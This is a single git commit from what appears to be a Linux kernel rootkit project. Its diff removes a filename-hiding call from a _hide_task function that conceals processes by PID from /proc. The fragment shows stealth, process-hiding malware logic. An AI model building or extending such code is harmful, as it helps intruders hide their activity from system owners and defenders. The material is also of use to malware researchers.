450b71937c3b896c4136a4c2df67e16246a0c512
JNE <jne@non-negative.org>
2024-12-07 18:30:51 +0000

    Removed unnecessary call to hide filename
    Forgot that hidden PID's /proc files
    don't even get to userspace :facepalm:

--- src/pid.c
+++ src/pid.c
@@ -81,9 +81,6 @@ static int _hide_task(void *data) {
 
     prinfo("hide [%p] %s : %d\n", ht->task, ht->task->comm, ht->task->pid);
 
-    fs_add_name_rw_dir(pidnum, 0, 0 /**XXX*/, true);
-
-
     /** debug */
 #ifdef DEBUG_RING_BUFFER
     ++ht_num;
